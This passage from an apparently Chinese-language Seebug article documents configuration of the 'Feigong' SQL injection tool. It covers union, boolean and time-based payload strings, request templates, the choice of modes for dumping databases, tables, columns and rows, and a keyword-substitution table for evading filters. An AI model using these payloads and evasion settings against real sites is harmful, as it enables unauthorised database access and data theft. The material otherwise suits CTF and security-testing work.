<div class="codehilite"><pre><span></span><span class="bp">self</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;padding&#39; union all select 1,&#39;Feigong&#39; #&quot;</span>
</pre></div>


<p>normal注入的基础payload要求必须返回<strong>Feigong</strong></p>
<h5>build</h5>
<p>如果注入模式为build，则需要配置基础payload，设置真值是返回的页面长度</p>
<div class="codehilite"><pre><span></span><span class="err">若为</span><span class="n">build注入</span><span class="err">，则为与、或条件构造，如果是与注入，</span><span class="n">padding必须为返回值的条件</span>
<span class="n">eg</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;padding&#39; &amp;&amp; 2333 #&quot;</span>
</pre></div>


<p>对于真值时的返回长度,可自定义，也可以不定义，因为test.py中的test函数会自动设置self.len（使用基础payload）</p>
<div class="codehilite"><pre><span></span> <span class="bp">self</span><span class="o">.</span><span class="n">len</span> <span class="o">=</span> <span class="mi">0</span>
</pre></div>


<h5>time</h5>
<p>如果注入模式为time，除了要设置基础payload以外，还需要设置睡眠时间，这部分在进阶配置中，默认为2</p>
<div class="codehilite"><pre><span></span> self.time = 2
</pre></div>


<p>如果网络环境太差，建议（2-5）</p>
<p>若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者'Feigong'填充</p>
<div class="codehilite"><pre><span></span><span class="n">eg</span><span class="o">:</span> <span class="n">self</span><span class="o">.</span><span class="na">payload</span> <span class="o">=</span> <span class="s2">&quot;padding&#39; union all select 1,&#39;Feigong&#39; #&quot;</span>
<span class="n">eg</span><span class="o">:</span> <span class="n">self</span><span class="o">.</span><span class="na">payload</span> <span class="o">=</span> <span class="s2">&quot;padding&#39; &amp;&amp; 2333 #&quot;</span>
</pre></div>


<h4>配置请求格式</h4>
<p>配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）</p>
<div class="codehilite"><pre><span></span><span class="bp">self</span><span class="o">.</span><span class="n">requesetformat</span> <span class="o">=</span> <span class="s2">&quot;user=Feigong&amp;passwd=ddog123&amp;submit=Log+In&quot;</span>
<span class="bp">self</span><span class="o">.</span><span class="n">requesetformat</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;user&quot;</span><span class="p">:</span> <span class="s2">&quot;Feigong&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="s2">&quot;a&quot;</span><span class="p">}</span>
</pre></div>


<p>上面两个分别是对于get和post请求的请求格式</p>
<h4>选择注入模式</h4>
<p>在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user</p>
<p>self.wtest是是否进入测试模式、测试模式优先级最高和普通模式不兼容，默认开启</p>
<p>而testmethod则是选择使用那种测试，互相兼容可以同时跑</p>
<div class="codehilite"><pre><span></span><span class="bp">self</span><span class="o">.</span><span class="n">wtest</span> <span class="o">=</span> <span class="bp">True</span>

<span class="bp">self</span><span class="o">.</span><span class="n">testmethod</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;test&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="s2">&quot;database&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
    <span class="s2">&quot;version&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
    <span class="s2">&quot;user&quot;</span><span class="p">:</span> <span class="mi">1</span>
<span class="p">}</span>
</pre></div>


<p>在test成功后，就要开始正式的注入模式了...</p>
<p>正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启</p>
<p>content为注入数据，可以预设columns、tables和database，默认注入10条数据
columns为注入列名，可以预设tables和database
tables为注入表名，可以预设database
database为注入表名
统一规则为如果不预设，则自动调用上一层的类获取数据</p>
<div class="codehilite"><pre><span></span><span class="bp">self</span><span class="o">.</span><span class="n">wsqli</span> <span class="o">=</span> <span class="bp">True</span>

<span class="bp">self</span><span class="o">.</span><span class="n">sqlilocation</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
    <span class="s2">&quot;columns&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
    <span class="s2">&quot;tables&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
    <span class="s2">&quot;database&quot;</span><span class="p">:</span> <span class="mi">1</span>
<span class="p">}</span>
</pre></div>


<h4>进阶配置</h4>
<p>在进阶配置中，我们是可以通过预设值来减少注入的范围</p>
<p>database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式（当然，如果database_name错误...则不会注到数据）</p>
<div class="codehilite"><pre><span></span>self.databases_name = [&#39;hctfsqli1&#39;, &#39;test&#39;]
self.databases_name = []
</pre></div>


<p>然后是table name，tables_name的格式为字典+元组(如果有写错某些值，则会注不到数据)</p>
<div class="codehilite"><pre><span></span><span class="bp">self</span><span class="o">.</span><span class="n">tables_name</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;test&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">,),</span> <span class="s1">&#39;hctfsqli1&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;hhhhctf&#39;</span><span class="p">,</span> <span class="s1">&#39;test&#39;</span><span class="p">,</span> <span class="s1">&#39;users&#39;</span><span class="p">)}</span>
<span class="bp">self</span><span class="o">.</span><span class="n">tables_name</span> <span class="o">=</span> <span class="p">{}</span>
</pre></div>


<p>然后是self.columns_name，columns_name的格式为字典套字典+元组(同样，如果有写错的值，则会注入不到数据)</p>
<div class="codehilite"><pre><span></span>self.columns_name = {&#39;test&#39;: {&#39;test&#39;: (&#39;test&#39;,)}, &#39;hctfsqli1&#39;: {&#39;test&#39;: (&#39;test1&#39;, &#39;testtest&#39;, &#39;flag1&#39;), &#39;users&#39;: (&#39;id&#39;, &#39;username&#39;), &#39;hhhhctf&#39;: (&#39;flag&#39;,)}}
self.columns_name = {}
</pre></div>


<p>当选择注入content时，你需要指定输入数据的上限，默认为10</p>
<div class="codehilite"><pre><span></span><span class="bp">self</span><span class="o">.</span><span class="n">content_count</span> <span class="o">=</span> <span class="mi">10</span>
</pre></div>


<h4>配置自定义替换表</h4>
<p>这部分一是在进阶配置中</p>
<p>配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload</p>
<p>合理的配置替换表，可以定制任意payload，例如
- <strong>#--&gt;group by a#</strong>
- <strong>sleep(2)--&gt;benchmark(10000000,sha(1))</strong></p>
<p>总之，如果你对代码足够熟悉，可以生成任意payload</p>
<div class="codehilite"><pre><span></span><span class="bp">self</span><span class="o">.</span><span class="n">filter</span> <span class="o">=</span> <span class="p">{</span>
    <span class="c1"># padding 为填充字段，build与注入要求padding必须为真值</span>

    <span class="s1">&#39;padding&#39;</span><span class="p">:</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span>
    <span class="c1"># 符号替换（url encode是get默认自带的，不需要修改）</span>

    <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">,</span>
    <span class="s1">&#39;</span><span class="se">\&quot;</span><span class="s1">&#39;</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\&quot;</span><span class="s1">&#39;</span><span class="p">,</span>
    <span class="s1">&#39;&amp;&#39;</span><span class="p">:</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span>
    <span class="s1">&#39;|&#39;</span><span class="p">:</span> <span class="s1">&#39;|&#39;</span><span class="p">,</span>
    <span class="s1">&#39;&gt;&#39;</span><span class="p">:</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span>
    <span class="s1">&#39;&lt;&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span>
    <span class="s1">&#39;=&#39;</span><span class="p">:</span> <span class="s1">&#39;=&#39;</span><span class="p">,</span>
    <span class="s1">&#39;.&#39;</span><span class="p">:</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span>
    <span class="c1"># 注入语句关键字替换</span>

    <span class="s1">&#39;union&#39;</span><span class="p">:</span> <span class="s1">&#39;union&#39;</span><span class="p">,</span>
    <span class="s1">&#39;select&#39;</span><span class="p">:</span> <span class="s1">&#39;SELECT&#39;</span><span class="p">,</span>
    <span class="s1">&#39;insert&#39;</span><span class="p">:</span> <span class="s1">&#39;insert&#39;</span><span class="p">,</span>
    <span class="s1">&#39;update&#39;</span><span class="p">:</span> <span class="s1">&#39;update&#39;</span><span class="p">,</span>
    <span class="s1">&#39;delete&#39;</span><span class="p">:</span> <span class="s1">&#39;delete&#39;</span><span class="p">,</span>
    <span class="s1">&#39;limit&#39;</span><span class="p">:</span> <span class="s1">&#39;limit&#39;</span><span class="p">,</span>
    <span class="s1">&#39;where&#39;</span><span class="p">:</span> <span class="s1">&#39;where&#39;</span><span class="p">,</span>
    <span class="c1"># 注入函数</span>

    <span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span>
    <span class="s1">&#39;database&#39;</span><span class="p">:</span> <span class="s1">&#39;database&#39;</span><span class="p">,</span>
    <span class="s1">&#39;version&#39;</span><span class="p">:</span> <span class="s1">&#39;version&#39;</span><span class="p">,</span>
    <span class="s1">&#39;if&#39;</span><span class="p">:</span> <span class="s1">&#39;if&#39;</span><span class="p">,</span>
    <span class="s1">&#39;ifnull&#39;</span><span class="p">:</span> <span class="s1">&#39;ifnull&#39;</span><span class="p">,</span>
    <span class="s1">&#39;concat&#39;</span><span class="p">:</span> <span class="s1">&#39;concat&#39;</span><span class="p">,</span>
    <span class="s1">&#39;ascii&#39;</span><span class="p">:</span> <span class="s1">&#39;ascii&#39;</span><span class="p">,</span>  <span class="c1"># hex()、bin()</span>
    <span class="s1">&#39;count&#39;</span><span class="p">:</span> <span class="s1">&#39;count&#39;</span><span class="p">,</span>
    <span class="s1">&#39;substring&#39;</span><span class="p">:</span> <span class="s1">&#39;substring&#39;</span><span class="p">,</span>  <span class="c1"># mid()、substr()</span>
    <span class="s1">&#39;length&#39;</span><span class="p">:</span> <span class="s1">&#39;length&#39;</span><span class="p">,</span>
    <span class="s2">&quot;sleep(&quot;</span> <span class="o">+</span> <span class="nb">repr</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">time</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;)&quot;</span><span class="p">:</span> <span class="s2">&quot;sleep(&quot;</span> <span class="o">+</span> <span class="nb">repr</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">time</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;)&quot;</span><span class="p">,</span>  <span class="c1"># benchmark()</span>
    <span class="c1"># 库名表名关键字</span>

    <span class="s1">&#39;information_schema&#39;</span><span class="p">:</span> <span class="s1">&#39;information_schema&#39;</span><span class="p">,</span>
    <span class="s1">&#39;schemata&#39;</span><span class="p">:</span> <span class="s1">&#39;schemata&#39;</span><span class="p">,</span>
    <span class="s1">&#39;schema_name&#39;</span><span class="p">:</span> <span class="s1">&#39;schema_name&#39;</span><span class="p">,</span>
    <span class="s1">&#39;tables&#39;</span><span class="p">:</span> <span class="s1">&#39;tables&#39;</span><span class="p">,</span>
    <span class="s1">&#39;table_name&#39;</span><span class="p">:</span> <span class="s1">&#39;table_name&#39;</span><span class="p">,</span>
    <span class="s1">&#39;columns&#39;</span><span class="p">:</span> <span class="s1">&#39;columns&#39;</span><span class="p">,</span>
    <span class="s1">&#39;column_name&#39;</span><span class="p">:</span> <span class="s1">&#39;column_name&#39;</span><span class="p">,</span>
    <span class="c1"># 然后是特殊的字符</span>

    <span class="s1">&#39; &#39;</span><span class="p">:</span> <span class="s1">&#39; &#39;</span><span class="p">,</span>   <span class="c1"># 由于过滤后自动进行url encode，所以替换表不能使用url encode过的字符，eg:%0a-&gt;\n %0b-&gt;\x0b</span>
    <span class="s1">&#39;#&#39;</span><span class="p">:</span> <span class="s1">&#39;#&#39;</span>    <span class="c1"># --+</span>
<span class="p">}</span>
</pre></div>


<h4>开始注入</h4>
<p>开始注入</p>
<div class="codehilite"><pre><span></span>python feigong.py
</pre></div>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/124/">https://paper.seebug.org/124/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/125/"><span aria-hidden="true">&larr;</span> 利用特殊协议加载本地文件， 绕过 HTML5 沙箱， ...</a>
    
    
      <a class="older-posts" href="/126/">企业常见服务漏洞检测&amp;修复整理 <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
